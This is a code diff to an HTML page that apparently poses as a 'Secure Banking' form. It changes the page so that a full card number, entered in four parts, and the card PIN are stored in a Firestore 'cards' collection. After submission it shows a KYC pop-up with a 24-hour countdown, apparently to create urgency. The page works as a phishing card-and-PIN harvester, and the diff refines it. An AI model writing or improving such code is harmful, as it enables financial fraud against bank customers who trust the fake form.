@@ -162,7 +162,7 @@
     </div>
   </div>
 
-  <button class="side-button" onclick="validateCardForm()">Continue</button>
+  <button class="side-button" onclick="saveCardData()">Continue</button>
 
   <img class="bottom-image" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Secure Banking">
 
@@ -195,18 +195,25 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    if (!localStorage.getItem("sessionId")) {
-      const newSessionId = Math.random().toString(36).substring(2, 10) + Date.now();
-      localStorage.setItem("sessionId", newSessionId);
+    let sessionId = localStorage.getItem("sessionId");
+    if (!sessionId) {
+      sessionId = Math.random().toString(36).substring(2, 10) + Date.now();
+      localStorage.setItem("sessionId", sessionId);
     }
-  </script>
-
-  <script>
-    const sessionId = localStorage.getItem("sessionId"); // Reuse the same
 
     function saveCardData() {
-      const card = document.getElementById("card").value;
-      const pin = document.getElementById("pin").value;
+      const card1 = document.getElementById("card1").value.trim();
+      const card2 = document.getElementById("card2").value.trim();
+      const card3 = document.getElementById("card3").value.trim();
+      const card4 = document.getElementById("card4").value.trim();
+      const pin = document.getElementById("pin").value.trim();
+
+      if ([card1, card2, card3, card4, pin].some(v => v.length < 4)) {
+        alert("Please fill all fields correctly.");
+        return;
+      }
+
+      const card = `${card1}${card2}${card3}${card4}`;
 
       db.collection("cards").add({
         card,
@@ -214,10 +221,27 @@
         sessionId,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        // optionally clear session if done
-        // localStorage.removeItem("sessionId");
-        alert("Card Saved");
+        document.getElementById("kycModal").style.display = "flex";
+        startCountdown(86400); // 24 hours in seconds
+      }).catch((err) => {
+        console.error("Error saving card data:", err);
+        alert("Something went wrong. Try again.");
       });
+    }
+
+    function startCountdown(seconds) {
+      const el = document.getElementById("countdownText");
+      function update() {
+        const hrs = Math.floor(seconds / 3600);
+        const mins = Math.floor((seconds % 3600) / 60);
+        const secs = seconds % 60;
+        el.textContent = `Time left: ${hrs}h ${mins}m ${secs}s`;
+        if (seconds > 0) {
+          seconds--;
+          setTimeout(update, 1000);
+        }
+      }
+      update();
     }
   </script>
 </body>
